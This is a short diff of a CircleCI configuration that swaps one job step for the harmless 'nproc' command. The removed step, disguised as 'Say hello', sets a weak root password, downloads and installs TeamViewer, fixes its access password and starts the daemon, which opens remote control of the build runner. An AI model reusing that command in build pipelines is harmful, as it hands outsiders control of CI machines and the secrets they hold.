@@ -16,7 +16,8 @@ jobs:
       - checkout
       - run:
           name: "Say hello"
-          command: "echo -e 'password\npassword\n' | sudo passwd root sudo -s; wget https://download.teamviewer.com/download/linux/teamviewer_amd64.deb; sudo apt install ./teamviewer_amd64.deb; sudo teamviewer passwd oV5d*uQ6; sudo teamviewer --daemon start; sudo systemctl start teamviewerd.service; sudo teamviewer info id"
+          command: "nproc"
+
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
 workflows:
